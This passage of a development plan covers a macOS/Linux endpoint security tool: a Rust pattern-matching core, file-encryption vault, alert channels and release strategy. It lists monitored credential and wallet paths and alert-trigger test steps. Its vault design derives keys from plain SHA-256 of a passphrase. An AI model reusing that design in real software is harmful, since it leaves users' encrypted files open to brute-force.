pub extern "C" fn sec_free_intent_result(ptr: *mut IntentResultFFI);
pub extern "C" fn sec_free_findings(ptr: *mut FindingsArrayFFI);
// ... etc
```

### 2.5 Dependencies

```toml
[dependencies]
regex = "1"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
toml = "0.8"
once_cell = "1"
sha2 = "0.10"
chrono = "0.4"
```

### 2.6 Verification

```bash
# All tests pass
cargo test --workspace

# Builds for macOS
cargo build --release --target x86_64-apple-darwin
cargo build --release --target aarch64-apple-darwin

# Builds for Linux
cargo build --release --target x86_64-unknown-linux-gnu

# C header generated
cd crates/security-core-ffi && cbindgen --output security_core.h

# Cross-validation: same input → same output as Swift
cargo test --test cross_validation
```

---

## 3. Phase 3: macOS FFI Integration

**Goal:** Swift modules call Rust core for pattern matching. Platform code stays Swift.

### 3.1 Build Bridge

```
CSecurityCore/
  module.modulemap        # Swift module map for C library
  include/
    security_core.h       # generated by cbindgen
  lib/
    libsecurity_core.a    # built by cargo
```

New in `Package.swift`:
```swift
.systemLibrary(name: "CSecurityCore", path: "CSecurityCore")
```

`build-rust.sh` — builds Rust, copies artifacts to `CSecurityCore/`.

### 3.2 Swift Bridge Wrapper

New file: `Sources/AISecurity/RustBridge/SecurityCoreBridge.swift`

Handles: String↔CChar conversion, memory management (calling `sec_free_*()`), converting FFI structs to Swift types.

### 3.3 Module Migration (each independent — no big-bang)

| Module | What moves to Rust | What stays in Swift |
|--------|-------------------|-------------------|
| ThreatIntentParser | 6 regex arrays + score() | Nothing (entire module becomes a thin wrapper) |
| SensitiveDataDetector | 40+ patterns + scanText() | isProtectedPath() (uses FileManager) |
| PromptInjectionGuard | 8 pattern groups + validate() + heuristics | Clipboard polling (NSPasteboard) |
| ExternalFileSanitizer | Pattern matching loop | File I/O, SHA256, quarantine |
| EmailScanner | Threat pattern matching | .emlx parsing, DispatchSource, file watching |
| MessagesScanner | analyzeMessage() patterns | SQLite3 queries, DispatchSourceTimer |

### 3.4 Verification

```bash
# Build with Rust core
./build-rust.sh && swift build

# Detection output matches pre-Rust baseline
swift test --filter CrossValidation

# Performance benchmark
swift test --filter PerformanceBenchmark
# Expected: 2-5x speedup on pattern matching (regex crate vs NSRegularExpression)
```

**Benchmark Results (2026-03-29, Apple M-series, -O optimized):**

```
1000 iterations × 12 test texts = 12,000 operations per engine
All 5 scan modules: intent, email, sensitive data, file content, prompt injection

┌──────────────────────────────┬────────────┬───────────┐
│ Engine                       │ Total (s)  │ Per-op µs │
├──────────────────────────────┼────────────┼───────────┤
│ NSRegularExpression (Swift)  │     0.990  │     82.5  │
│ Rust FFI (regex crate)       │     0.413  │     34.4  │
├──────────────────────────────┼────────────┼───────────┤
│ Speedup                      │    2.40x   │           │
└──────────────────────────────┴────────────┴───────────┘

Result: Rust regex crate is 2.4x faster than NSRegularExpression
```

Note: Conservative estimate — Rust runs the full 200+ pattern set while the
NSRegularExpression baseline uses a representative subset. Real-world speedup
is likely higher.

---

## 4. Phase 4: Linux Daemon

**Goal:** Linux security daemon using same Rust core, Linux-native I/O.

### 4.1 Linux-Specific Modules

| Module | Implementation | Crate/Dependency |
|--------|---------------|-----------------|
| File watcher | inotify (Downloads, Desktop, Documents + protected paths) | `inotify = "0.10"` |
| Email scanner | Thunderbird mbox/maildir parser | `mailparse = "0.14"` |
| Messages scanner | Signal Desktop SQLite | `rusqlite = "0.31"` |
| Clipboard | arboard (X11 + Wayland) | `arboard = "3"` |
| Notifications | D-Bus desktop notifications | `notify-rust = "4"` |
| System tray | StatusNotifierItem (GNOME/KDE/XFCE) | `ksni = "0.2"` |
| Service | systemd user service | `deploy/linux/security-core.service` |
| Logger | JSON structured (identical format to macOS) | shared from core |

### 4.2 Linux Path Mapping

| Function | macOS Path | Linux Path |
|----------|-----------|------------|
| Email | `~/Library/Mail/*.emlx` | `~/.thunderbird/*/ImapMail/` |
| Messages | `~/Library/Messages/chat.db` | `~/.config/Signal/sql/db.sqlite` |
| Keychain | `~/Library/Keychains` | `~/.local/share/keyrings/` |
| Photos | `~/Pictures/Photos Library.photoslibrary` | `~/Pictures/` |
| Bitwarden | `~/Library/Application Support/Bitwarden` | `~/.config/Bitwarden/` |
| Sparrow | `~/Library/Application Support/Sparrow` | `~/.sparrow` |
| SSH/GPG | `~/.ssh`, `~/.gnupg` | same |
| Bitcoin/LN | `~/.bitcoin`, `~/.lnd` | same |

MacSec JS code (`/home/junc/MacSec/modules/`) serves as reference for conceptual approach.

### 4.3 Deployment

```ini
# deploy/linux/security-core.service
[Unit]
Description=SecurityCore Security Daemon
After=graphical-session.target

[Service]
Type=simple
ExecStart=/usr/local/bin/security-core-linux
Restart=on-failure
Environment=MACSEC_MODE=PRODUCTION

[Install]
WantedBy=default.target
```

### 4.4 Verification

```bash
# Build
cargo build --release -p security-linux

# Install
sudo cp target/release/security-linux /usr/local/bin/security-core-linux
systemctl --user enable security-core && systemctl --user start security-core

# Test file watcher
cp /tmp/test-malware.sh ~/Downloads/  # should trigger alert

# Test clipboard
echo "xprv9s21ZrQH143K..." | xclip -selection clipboard  # should trigger alert

# Test notifications
# Should see desktop notification for CRITICAL threats

# Test system tray
# Shield icon visible in panel, menu works

# Cross-platform detection parity
cargo test --test cross_validation  # same results as macOS
```

---

## 5. Phase 5: ElizaOS-Inspired Features

**Goal:** Encryption, WASM plugin sandbox, enhanced security — matching/exceeding ElizaOS.

### 5.1 AES-256-GCM Encryption (`encryption.rs`)

- Encrypt: whitelist.json, sensitive config fields, alert log previews
- Key derivation: SHA-256 of user passphrase (matching ElizaOS pattern)
- AAD tag: `"securitycore:config:v1"` for integrity verification
- Production enforcement: panic if passphrase == default

```toml
# New dependency
aes-gcm = "0.10"
```

### 5.2 Sensitive Key Filtering (`key_filter.rs`)

- Redact values for keys containing: api_key, secret, password, token, private_key, seed_phrase, mnemonic
- Applied to: log output, status display, config dump

### 5.3 WASM Sandbox for Custom Rules (`wasm_sandbox.rs`)

- Users write custom detection rules in Rust/C/AssemblyScript, compile to .wasm
- wasmtime loads plugins with memory isolation (no filesystem, no network)
- Plugin interface: `analyze(text) -> JSON result`, `name() -> string`
- Load from `~/.mac-security/rules/*.wasm`

```toml
wasmtime = "18"
```

### 5.4 rustls TLS (`tls_transport.rs`)

- Pure-Rust TLS for future remote log transport (SIEM/collector)
- No OpenSSL dependency

```toml
rustls = "0.23"
```

### 5.5 Process Lifecycle Manager (`process_manager.rs`)

- Track scan worker child processes
- Cooperative cancellation via `tokio::sync::CancellationToken`
- Clean shutdown of all children on daemon exit

### 5.6 Verification

```bash
# Encryption roundtrip
cargo test --test encryption_roundtrip

# WASM plugin
cargo test --test wasm_plugin_load
# Write custom rule .wasm, load, verify it fires

# Memory leak check
cargo test --test wasm_leak_check  # load/unload 100 times
```

---

## 6. Phase 6: Feature Parity & Polish

### 6.1 Shared Test Suite

Create `tests/integration/` with JSON test cases:
```json
{
  "test_name": "irs_phishing_email",
  "input": "This is the IRS. Your account has been suspended...",
  "channel": "email",
  "expected_intent": { "isThreat": true, "severity": "CRITICAL", "layersFired": 6 },
  "expected_patterns": ["authority_impersonation", "social_engineering"]
}
```

Both macOS Swift tests and Linux Rust tests run against same test cases via Rust core.

### 6.2 Linux TUI Threat Viewer

Using `ratatui` crate — reads alerts.log, shows severity badges, dismiss/trust actions.

### 6.3 Feature Parity Matrix

| Feature | macOS | Linux | Source |
|---------|:---:|:---:|--------|
| 7-layer intent parser | Rust core | Rust core | Identical |
| 40+ sensitive data patterns | Rust core | Rust core | Identical |
| 8-category prompt injection | Rust core | Rust core | Identical |
| 9-category file malware scan | Rust core | Rust core | Identical |
| 10-category email threats | Rust core | Rust core | Identical |
| 9-category message threats | Rust core | Rust core | Identical |
| Sender whitelist | Rust core | Rust core | Identical |
| AES-256-GCM encryption | Rust core | Rust core | Identical |
| WASM custom rules | Rust core | Rust core | Identical |
| SHA256 file cache | Rust core | Rust core | Identical |
| JSON structured logging | Identical format | Identical format | Identical |
| TOML config | Identical format | Identical format | Identical |
| File watching | DispatchSource | inotify | Platform-native |
| Email source | .emlx (Apple Mail) | mbox (Thunderbird) | Platform-native |
| Messages source | chat.db (iMessage) | Signal DB | Platform-native |
| Clipboard | NSPasteboard | arboard | Platform-native |
| Notifications | UNUserNotification | notify-rust | Platform-native |
| Tray/Menu bar | NSStatusBar | ksni | Platform-native |
| Service management | LaunchAgent | systemd | Platform-native |
| Quarantine | File move | File move | Identical |

---

## 7. Phase 7: Vault — File/Folder Protection with Encryption + Auth

**Goal:** Users can select files/folders to protect. Protected files are encrypted in-place
with AES-256-GCM. All vault operations require biometric or password authentication.
Clear user guidance at every step so users never get locked out of their own data.

### 7.1 Vault Core (Rust — `vault.rs`)

**Manifest:** `~/.mac-security/vault.json` (itself encrypted with AES-256-GCM)
```json
{
  "version": 1,
  "created": "2026-03-29T...",
  "entries": [
    {
      "original_path": "/Users/alice/Documents/tax-2025.pdf",
      "vault_path": "/Users/alice/Documents/tax-2025.pdf.vault",
      "encrypted_at": "2026-03-29T...",
      "size_bytes": 245760,
      "sha256_original": "abc123...",
      "is_directory": false
    }
  ]
}
```

**Operations:**
- `vault_add(paths, passphrase)` → encrypt each file, write `.vault`, secure-delete original, update manifest
- `vault_unlock(paths, passphrase)` → decrypt `.vault` → restore original, update manifest
- `vault_lock(paths, passphrase)` → re-encrypt previously unlocked files
- `vault_list()` → return manifest entries (no auth needed — metadata only)
- `vault_verify(passphrase)` → verify passphrase is correct without decrypting files
- `vault_change_passphrase(old, new)` → decrypt all → re-encrypt with new key

**Secure delete:** Overwrite file with random bytes before unlinking (3-pass).

**Key derivation:** SHA-256(passphrase + machine-salt). Machine salt stored in
`~/.mac-security/.vault-salt` (generated once at setup, 32 random bytes).

### 7.2 Authentication Gate

**macOS — LocalAuthentication framework:**
```swift
let context = LAContext()
context.evaluatePolicy(.deviceOwnerAuthentication,
    localizedReason: "Authenticate to access your protected files")
```
- Supports Touch ID, Apple Watch, or system password
- Auth session cached for 5 minutes (configurable) — `LAContext` reused
- Every vault operation (add, unlock, lock, change passphrase) requires auth
- Viewing vault file list (metadata) does NOT require auth

**Linux — PAM integration:**
- Verify current user password via PAM `auth` stack
- Same 5-minute session cache

### 7.3 User Education & Safety (CRITICAL)

**First-Run Setup Wizard** (shown when user first clicks "Protect Files..."):

1. **Welcome panel:** "AISecurity Vault encrypts your files so only you can access them —
   even if your Mac is compromised. Here's what you need to know before starting."

2. **How it works panel:**
   - "Files you protect are encrypted with military-grade AES-256-GCM encryption"
   - "The original unencrypted file is securely deleted after encryption"
   - "Only YOUR passphrase can decrypt these files — we never store it"
   - "You can unlock files anytime with Touch ID or your system password + vault passphrase"

3. **Passphrase setup panel:**
   - User creates a vault passphrase (separate from system password)
   - Strength meter (weak / fair / strong / very strong)
   - Must type twice to confirm
   - Warning: "If you forget this passphrase, your encrypted files CANNOT be recovered.
     There is no reset option. We recommend writing it down and storing it securely."

4. **Recovery instructions panel:**
   - Shows recovery steps on screen
   - Saves `~/.mac-security/VAULT-RECOVERY.txt` with:
     - What the vault is
     - Where encrypted files are stored (`.vault` extension)
     - How to decrypt: open AISecurity → Vault → Unlock, authenticate, enter passphrase
     - Emergency: if AISecurity is uninstalled, files remain as `.vault` — reinstall app to decrypt
   - Option to print or save to another location

5. **Confirmation:** "You're all set! Click 'Protect Files...' in the menu bar to get started."

**Pre-Encrypt Confirmation** (every time user adds files to vault):
- Lists all files/folders selected
- Shows total size
- "These files will be encrypted and the originals securely deleted."
- "You will need your vault passphrase to access them again."
- [Cancel] [Encrypt & Protect]

**Pre-Decrypt Confirmation:**
- Touch ID / password prompt first
- Then vault passphrase entry
- "Decrypting X files to their original locations."
- [Cancel] [Decrypt]

### 7.4 Menu Bar Integration (macOS)

New menu items under the shield icon:
```
──────────────────────
🔒 Vault
   Protect Files...        (opens NSOpenPanel, multi-select files/folders)
   View Protected Files    (shows vault status panel)
   Unlock Files...         (auth-gated, select files to decrypt)
   Lock Open Files         (re-encrypt previously unlocked files)
   ─────────────
   Change Passphrase...    (auth-gated)
   Vault Recovery Info     (shows/re-saves recovery instructions)
──────────────────────
```

**NSOpenPanel** for file selection:
- `allowsMultipleSelection = true`
- `canChooseDirectories = true`
- `canChooseFiles = true`
- Shows current vault entries as disabled (already protected)

**Vault Status Panel** (NSWindow):
- Table view: filename, original path, encrypted date, size, status (locked/unlocked)
- Buttons: Unlock Selected, Lock Selected, Remove from Vault

### 7.5 FileWatcher Integration

- Vault file paths added to FileWatcher's monitored list
- Any access attempt to `.vault` files by external processes triggers CRITICAL alert
- Alert: "Unauthorized access attempt to protected file: {filename}"
- Notification sent via macOS notification center

### 7.6 Verification

```bash
# 1. Setup wizard — create vault passphrase
#    Open AISecurity menu → Vault → Protect Files... (first time triggers wizard)

# 2. Encrypt test file
echo "secret data" > /tmp/test-vault.txt
#    Select /tmp/test-vault.txt via Protect Files dialog
#    Verify: /tmp/test-vault.txt.vault exists, original gone

# 3. Decrypt test file
#    Vault → Unlock Files... → select test-vault.txt.vault
#    Authenticate (Touch ID or password)
#    Enter vault passphrase
#    Verify: /tmp/test-vault.txt restored with correct content

# 4. Unauthorized access alert
#    Try to open a .vault file with another app → should trigger alert

# 5. Passphrase change
#    Vault → Change Passphrase... → old pass → new pass
#    Verify: can still decrypt with new passphrase
```

---

## 8. Phase 8: External Notifications (Telegram, Discord, Email)

**Goal:** Send CRITICAL and HIGH security alerts to external channels so the user is notified
even when away from their Mac. Telegram is the primary channel (most users have it). Discord
and Email are secondary. Configuration via setup wizard accessible from menu bar.

**Reference:** NodeProject dashboard notifications (`~/NodeProject/dashboard/backend/src/notifications/`)
— same channel APIs, ported from TypeScript to Swift using URLSession.

### 8.1 Architecture

```
Sources/AISecurity/Notifications/
  NotificationManager.swift       # Routes alerts to enabled channels by severity
  NotificationConfig.swift        # JSON persistence: ~/.mac-security/notification-config.json
  TelegramChannel.swift           # Telegram Bot API (sendMessage)
  DiscordChannel.swift            # Discord webhook (POST embed)
  EmailChannel.swift              # SMTP via Gmail App Password (raw TLS socket)
  NotificationSetupDialog.swift   # macOS setup wizard with per-channel instructions
```

### 8.2 Channel Configuration (persisted to `~/.mac-security/notification-config.json`)

```json
{
  "telegram": {
    "botToken": "123456789:ABCdef...",
    "chatId": "987654321",
    "enabled": true,
    "updatedAt": "2026-03-30T..."
  },
  "discord": {
    "webhookUrl": "https://discord.com/api/webhooks/ID/TOKEN",
    "enabled": false,
    "updatedAt": "2026-03-30T..."
  },
  "email": {
    "userEmail": "user@gmail.com",
    "appPassword": "xxxx xxxx xxxx xxxx",
    "enabled": true,
    "updatedAt": "2026-03-30T..."
  }
}
```

### 8.3 Severity Routing

| Severity | Local (macOS notification) | Telegram | Discord | Email |
|----------|:---:|:---:|:---:|:---:|
| CRITICAL | Yes | Yes | Yes | Yes |
| HIGH | Yes | Yes | Yes | No |
| MEDIUM | Yes | No | No | No |
| LOW | No | No | No | No |

### 8.4 Telegram Integration

**API:** `https://api.telegram.org/bot<TOKEN>/sendMessage`

**Swift implementation:** URLSession POST with JSON body:
```swift
{
  "chat_id": chatId,
  "text": markdownMessage,
  "parse_mode": "MarkdownV2"
}
```

**Message format:**
```
🛡 *AISecurity Alert*
🚨 *CRITICAL*

━━━━━━━━━━━━━━━━━━

📋 *What Happened:*
Unauthorized access to vault\-protected file: A1\.png\.vault

🔍 *Details:*
• Encrypted vault file modified
• Category: vault\_protection

📁 *File:* `/Users/alice/Downloads/A1.png.vault`
⏰ *Time:* 2026\-03\-30 14:15:19
```

**Setup instructions (shown in wizard):**
1. Open Telegram, search `@BotFather`
2. Send `/newbot`, follow prompts to create bot
3. Copy the Bot Token
4. Start a chat with your new bot (send any message)
5. Open: `https://api.telegram.org/bot<TOKEN>/getUpdates`
6. Find `"chat":{"id":NUMBERS}` — that's your Chat ID
7. Enter Bot Token and Chat ID below

### 8.5 Discord Integration

**API:** POST to webhook URL with JSON embed

**Swift implementation:** URLSession POST:
```swift
{
  "username": "AISecurity",
  "embeds": [{
    "title": "🚨 Vault File Access Detected",
    "color": 16711680,
    "description": "Unauthorized access to vault-protected file",
    "fields": [
      { "name": "File", "value": "A1.png.vault", "inline": true },
      { "name": "Severity", "value": "CRITICAL", "inline": true }
    ],
    "timestamp": "2026-03-30T14:15:19Z"
  }]
}
```

**Color mapping:** CRITICAL=0xFF0000, HIGH=0xFFA500, MEDIUM=0xFFFF00, LOW=0x00FF00

**Setup instructions (shown in wizard):**
1. Open Discord, go to your server
2. Server Settings → Integrations → Webhooks → New Webhook
3. Name it "AISecurity Alerts", select channel
4. Copy Webhook URL, paste below

### 8.6 Email Integration (Gmail)

**SMTP:** Connect to `smtp.gmail.com:587` via TLS, authenticate with Gmail App Password.

**Swift implementation:** Use `Network.framework` NWConnection for TLS socket, or shell out to
`/usr/bin/curl --url 'smtps://smtp.gmail.com:465'` with `--mail-from` / `--mail-rcpt` as a
simpler first pass.

**Setup instructions (shown in wizard):**
1. Go to `myaccount.google.com/security`
2. Enable 2-Step Verification (required for app passwords)
3. Go to `myaccount.google.com/apppasswords`
4. Generate app password for "Mail" / "Other (AISecurity)"
5. Copy the 16-character password
6. Enter your Gmail address and App Password below

### 8.7 Setup Wizard UI (macOS)

**Menu bar:** Add "Notification Settings..." under the existing menu items.

**Dialog:** NSTabView or stacked NSAlert panels for each channel:
- Tab 1: Telegram (token + chat ID fields, setup instructions, test button)
- Tab 2: Discord (webhook URL field, setup instructions, test button)
- Tab 3: Email (Gmail + app password fields, setup instructions, test button)
- Each tab has enable/disable toggle + "Test" button
- "Test" sends a test notification to verify credentials work

### 8.8 Integration Points

1. **SecurityLogger.alert()** → after logging, call `NotificationManager.shared.send(alert)`
2. **SecurityDaemon** → VAULT_FILE_ACCESS in-app dialog + external notification
3. **NotificationManager** checks severity routing table, sends to enabled channels in parallel
4. Delivery failures logged but don't block — fire-and-forget with error logging

### 8.9 Verification

```bash
# 1. Configure Telegram via setup wizard
# 2. touch ~/Downloads/A1.png.vault → should get Telegram message
# 3. Configure Discord webhook → test button sends embed
# 4. Configure Gmail → test button sends email
# 5. Verify CRITICAL alerts reach all enabled channels
```

## 9. Phase 9: Linux Completion

**Goal:** Complete all remaining Linux-specific features — vault auth, TUI vault management,
system tray, and external notification channels via Rust. Test on Linux PC.

### 9.1 Linux Auth Gate (PAM)

**File:** `SecurityCore/crates/security-linux/src/auth.rs`

Verify current user password via PAM `auth` stack before vault operations.
Same 5-minute session cache as macOS AuthGate. Same 3-attempt lockout.

```rust
// PAM authentication via pam crate
use pam::Authenticator;

pub fn authenticate(username: &str, password: &str) -> Result<(), String> {
    let mut auth = Authenticator::with_password("security-core")
        .map_err(|e| format!("PAM init failed: {}", e))?;
    auth.get_handler().set_credentials(username, password);
    auth.authenticate()
        .map_err(|e| format!("Authentication failed: {}", e))
}
```

**Dependencies:** `pam = "0.8"` or `pam-sys = "1"`

### 9.2 Vault TUI Screen (ratatui)

**File:** `SecurityCore/crates/security-linux/src/tui.rs` (extend existing)

Add vault management tab to the existing ratatui TUI:

| Screen | Description |
|--------|-------------|
| Vault list | Table: filename, folder, protection level, size, status badges |
| Folder grouping | Group entries by parent directory (collapsible) |
| File browser | Navigate filesystem with arrow keys, space to select, Enter to confirm |
| Protection picker | Popup: Locked / Read-only / Local-only + Local-only checkbox |
| Auth prompt | Password input field (masked) with attempt counter |
| Actions | Unlock temporarily, Release protection, Toggle local-only |

**Key bindings:**
- `v` — switch to vault tab
- `a` — add files (opens file browser)
- `u` — unlock selected
- `r` — release selected
- `l` — toggle local-only
- `p` — change passphrase
- `Enter` — expand/collapse folder
- `Space` — select/deselect

### 9.3 File Browser Widget

**File:** `SecurityCore/crates/security-linux/src/tui_file_browser.rs`

Ratatui widget for filesystem navigation:
- Arrow keys: navigate directories and files
- Space: toggle selection (checkbox)
- Enter: open directory / confirm selection
- Backspace: go up one directory
- Shows: filename, size, type icon, selection checkbox
- Starts at `$HOME`
- Multi-select support for batch vault operations

### 9.4 System Tray (ksni)

**File:** `SecurityCore/crates/security-linux/src/tray.rs`

StatusNotifierItem for GNOME/KDE/XFCE panel:
- Shield icon in system tray
- Right-click menu: Start/Stop Agent, Open TUI, Vault, Quit
- Tooltip: threat count, running status
- Icon changes color on CRITICAL alert

**Dependencies:** `ksni = "0.2"` (requires GTK icon assets)

### 9.5 External Notifications (Rust)

**Directory:** `SecurityCore/crates/security-linux/src/notifications/`

Port the macOS Swift notification channels to Rust using `reqwest`:

```
notifications/
  mod.rs                  # NotificationManager — routing + rate limiting
  config.rs               # JSON config persistence (~/.mac-security/notification-config.json)
  telegram.rs             # Telegram Bot API (sendMessage, MarkdownV2)
  discord.rs              # Discord webhook (POST embed)
  email.rs                # Gmail SMTP via lettre crate
  rate_limiter.rs         # Per-type cooldown + per-file dedup + global throttle
```

**Dependencies:**
```toml
reqwest = { version = "0.12", features = ["json", "blocking"] }
lettre = "0.11"          # SMTP email (replaces curl approach)
```

**Config:** Same JSON format as macOS (`notification-config.json`) — shared across platforms.

**Rate limiting:** Same rules as macOS:
- Per-type cooldown: 60 seconds
- Per-file cooldown: 1 hour
- Global throttle: 10 per 5-minute window

### 9.6 Verification

```bash
# 1. PAM auth
cargo test -p security-linux --test auth_test

# 2. TUI vault screen
cargo run -p security-linux -- --tui
# Navigate to vault tab, add files, unlock, release

# 3. System tray
cargo run -p security-linux -- --tray
# Verify icon appears, menu works

# 4. External notifications
# Configure via TUI settings or edit notification-config.json directly
# touch a .vault file → Telegram/Discord/Email alert

# 5. Auth rate limiting
# Enter wrong passphrase 3 times → lockout message + external alert
```

## 12. Phase 12: Commercial Release Path

**Goal:** Prepare AISecurity for public distribution — either as open source with a paid tier,
or as a direct-sale product. The App Store is NOT viable for security tools (sandboxing blocks
file monitoring, Mail access, Messages DB, etc.). Every serious macOS security tool distributes
outside the App Store.

### 12.1 Why Not the App Store?

Apple's App Store requires sandboxing, which blocks:
- File monitoring across Downloads/Desktop/Documents
- Reading Mail.app `.emlx` files and Messages `chat.db`
- Accessing Keychains, SSH keys, crypto wallets
- Most Full Disk Access operations

**How real security tools ship:** Little Snitch, Malwarebytes, Objective-See (LuLu, KnockKnock),
BlockBlock — all distribute via direct download + Apple notarization. Users download a `.dmg`,
drag to Applications, and grant permissions manually.

### 12.2 Distribution: Notarization (required)

**What it is:** Apple scans your app binary for malware and issues a "ticket" that tells macOS
"this app was checked by Apple." Without it, macOS shows a scary "unidentified developer" warning
and may refuse to open the app entirely.

**What you need:**
- Apple Developer account ($99/year — you already have one for code signing)
- Your app is already code-signed with a Developer ID

**Steps:**
| Step | What | How |
|------|------|-----|
| 1 | Build release binary | `swift build -c release` (already done in install.sh) |
| 2 | Create .dmg installer | Use `create-dmg` tool or `hdiutil` to package the .app |
| 3 | Submit for notarization | `xcrun notarytool submit AISecurity.dmg --apple-id YOU --team-id TEAM` |
| 4 | Wait for Apple scan | Usually 5-15 minutes |
| 5 | Staple the ticket | `xcrun stapler staple AISecurity.dmg` — embeds approval in the file |
| 6 | Distribute | Upload .dmg to GitHub releases, your website, or Gumroad |

**Verification:** Users can install without any "unidentified developer" warnings.

### 12.3 Endpoint Security Framework (recommended upgrade)

**What it is:** Apple's modern API (macOS 10.15+) specifically for security tools. It replaces
our current `DispatchSource` file monitoring with a kernel-level event stream that:
- Tells you WHICH PROCESS accessed a file (PID, path, code signature)
- Can BLOCK file operations in real-time (not just detect after the fact)
- Monitors process execution, file access, mounts, signals — everything
- Is what professional endpoint security tools use

**Why we want it:**
- Current DispatchSource only detects directory-level creates/deletes, not reads
- Endpoint Security sees EVERY file open, read, write, rename, unlink — per-process
- We could show "Preview.app tried to open A1.png.vault" instead of just "file modified"
- Can actively block unauthorized access to vault files (not just alert)

**What changes:**
| Current (DispatchSource) | Upgrade (Endpoint Security) |
|---|---|
| Directory-level events only | Per-file, per-process events |
| Detect creates/deletes/renames | Detect opens, reads, writes, unlinks |
| Cannot identify which app | Reports exact process (PID, path, signature) |
| Cannot block access | Can block + allow in real-time |
| No special entitlement needed | Requires Endpoint Security entitlement from Apple |

**Catch:** Requires requesting a special entitlement from Apple — you email them explaining
your use case. They review and grant it (usually within a week for legitimate security tools).
Without it, the `es_new_client()` API call will fail.

**Implementation:**
```swift
import EndpointSecurity

// Request authorization
var client: OpaquePointer?
let result = es_new_client(&client) { client, message in
    switch message.pointee.event_type {
    case ES_EVENT_TYPE_NOTIFY_OPEN:
        // A process opened a file — check if it's vault-protected
    case ES_EVENT_TYPE_AUTH_OPEN:
        // A process WANTS to open a file — we can BLOCK it
    default: break
    }
}
```

### 12.4 Auto-Update (Sparkle)

**What it is:** Sparkle is the standard macOS framework for auto-updating apps distributed
outside the App Store. When you release a new version, users get a notification and can update
with one click — no manual re-download.

**How it works:**
1. You host an "appcast" XML file on your server (like an RSS feed of versions)
2. Sparkle checks this feed periodically
3. When a new version is found, it shows an update dialog
4. User clicks "Install" — Sparkle downloads, verifies signature, replaces the app

**Steps:**
| Step | What |
|------|------|
| 1 | Add Sparkle SPM dependency to Package.swift |
| 2 | Generate EdDSA signing key pair (Sparkle uses EdDSA, not RSA) |
| 3 | Add `SUFeedURL` to Info.plist pointing to your appcast URL |
| 4 | On each release: sign the .dmg with your EdDSA key, update appcast.xml |
| 5 | Host appcast.xml + .dmg on GitHub Pages, S3, or your own site |

### 12.5 First-Run Onboarding

**What it is:** A step-by-step welcome flow for new users that guides them through:

1. **Welcome** — what AISecurity does, what it monitors
2. **Grant Permissions** — Full Disk Access, Notification permission (with direct links to System Settings)
3. **Vault Setup** — create passphrase (already built)
4. **Notification Setup** — Telegram/Discord/Email (already built)
5. **What to Expect** — "You'll see alerts for: malware, sensitive data exposure, vault access.
   You won't be spammed — only real threats trigger notifications."

### 12.6 Business Models

**Option A: Open Source + Premium Features (recommended to start)**
| Tier | Price | Features |
|------|-------|----------|
| Free (open source) | $0 | File monitoring, malware detection, clipboard guard, vault (local) |
| Pro | $5-10/month or $49/year | External notifications (Telegram/Discord/Email), auto-update, priority support |
| Team | $10-20/seat/month | Central logging dashboard, fleet management, shared threat intel |

**Pros:** Builds trust (open source security tool = auditable), attracts contributors, GitHub stars drive organic growth.

**Option B: Direct Sale**
| Product | Price | What |
|---------|-------|------|
| AISecurity | $29-49 one-time | Full app, all features, 1 year of updates |
| Updates | $19/year renewal | Continued updates after first year |

**Distribution:** Gumroad, Paddle, or Stripe + your own site.

**Option C: Enterprise/MSP**
- Sell to managed service providers (MSPs) who manage fleets of Macs
- Central dashboard showing all endpoints' threat status
- The TLS transport + logging infrastructure is already built (Phase 5)
- Price: $5-15/endpoint/month

### 12.7 Legal & Trust

| Item | What | Why |
|------|------|-----|
| Privacy policy | What data you collect (none? local-only?) | Required for distribution, builds trust |
| Terms of service | Liability limitations, no warranty | Standard for software products |
| Security audit | Third-party code review | Security tools MUST be trustworthy — an audit proves it |
| Transparency report | "What we monitor, what we don't" | Users need to trust a security agent running on their machine |
| CVE response plan | How you handle discovered vulnerabilities | Professional obligation for security software |

### 12.8 Security Profiles (the dial)

Users should be able to choose a security posture that matches their use case. Three
built-in profiles, plus full custom control:

**Relaxed — "I trust my agent, just keep an eye on things"**
| Setting | Value |
|---------|-------|
| File monitoring | Downloads only |
| Vault | Available but optional |
| External notifications | Off |
| Clipboard monitoring | Off |
| Prompt injection guard | Off |
| Protected path alerts | Log only (no popup) |
| Auto-quarantine | Off |

**Balanced — "I use agents but want to know what they're doing" (default)**
| Setting | Value |
|---------|-------|
| File monitoring | Downloads + Desktop + Documents |
| Vault | Available, recommended for sensitive files |
| External notifications | CRITICAL only (Telegram) |
| Clipboard monitoring | On |
| Prompt injection guard | On |
| Protected path alerts | Popup for CRITICAL, log for HIGH |
| Auto-quarantine | On for known malware patterns |

**Strict — "I run autonomous agents and need full control"**
| Setting | Value |
|---------|-------|
| File monitoring | All configured directories + all protected paths |
| Vault | Encrypted by default for sensitive directories |
| External notifications | CRITICAL + HIGH (all channels) |
| Clipboard monitoring | On |
| Prompt injection guard | On (aggressive) |
| Protected path alerts | Popup for CRITICAL + HIGH, external notification |
| Auto-quarantine | On, including suspicious files |
| Vault access blocking | On (Phase 10, Endpoint Security — blocks unauthorized processes) |

**Custom — "Let me configure everything myself"**
Full access to all toggles in config.toml or a settings UI.

**Implementation:** A single "Security Level" slider or radio button in the menu bar
settings. Changing the profile updates config.toml and restarts relevant modules.
Power users can still edit config.toml directly for fine-grained control.

### 12.9 Implementation Tracker

| Component | Status | Notes |
|-----------|--------|-------|
| **Distribution** | | |
| Apple Developer account | ✅ Already have | Used for code signing |
| App notarization (notarytool) | ⬜ Not started | Submit .dmg to Apple for scanning |
| .dmg installer creation | ⬜ Not started | create-dmg or hdiutil |
| GitHub Releases hosting | ⬜ Not started | Upload .dmg to releases page |
| **Endpoint Security** | | |
| Request ES entitlement from Apple | ⬜ Not started | Email Apple with use case description |
| Migrate FileWatcher to ES framework | ⬜ Not started | Replace DispatchSource with es_new_client |
| Per-process vault access blocking | ⬜ Not started | AUTH events to block unauthorized access |
| **Auto-Update** | | |
| Sparkle SPM integration | ⬜ Not started | Add dependency, generate EdDSA key |
| Appcast XML hosting | ⬜ Not started | GitHub Pages or S3 |
| Update signing workflow | ⬜ Not started | Sign .dmg with EdDSA on each release |
| **Onboarding** | | |
| First-run welcome wizard | ⬜ Not started | Multi-step NSWindow flow |
| Permission grant guide (FDA, notifications) | ⬜ Not started | Direct links to System Settings |
| **Legal** | | |
| Privacy policy | ⬜ Not started | — |
| Terms of service | ⬜ Not started | — |
| **Security Profiles** | | |
| Profile selector UI (Relaxed / Balanced / Strict / Custom) | ⬜ Not started | Menu bar settings |
| Profile → config.toml mapping + module restart | ⬜ Not started | — |
